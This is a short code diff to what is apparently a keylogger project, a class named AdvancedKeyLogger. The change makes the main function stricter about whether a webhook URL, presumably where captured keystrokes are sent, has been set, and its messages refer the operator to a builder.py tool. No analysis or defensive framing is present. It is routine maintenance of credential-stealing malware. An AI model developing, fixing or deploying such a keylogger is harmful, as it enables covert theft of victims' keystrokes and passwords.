@@ -584,7 +584,7 @@ class AdvancedKeyLogger:
 def main():
     """Main entry point"""
     # Check if webhook URL is configured
-    if WEBHOOK_URL == "WEBHOOK_URL_PLACEHOLDER":
+    if "WEBHOOK_URL_PLACEHOLDER" in WEBHOOK_URL or not WEBHOOK_URL or len(WEBHOOK_URL) < 50:
         print("[!] ERROR: Webhook URL not configured!")
         print("[!] Please use builder.py to configure the keylogger")
         sys.exit(1)
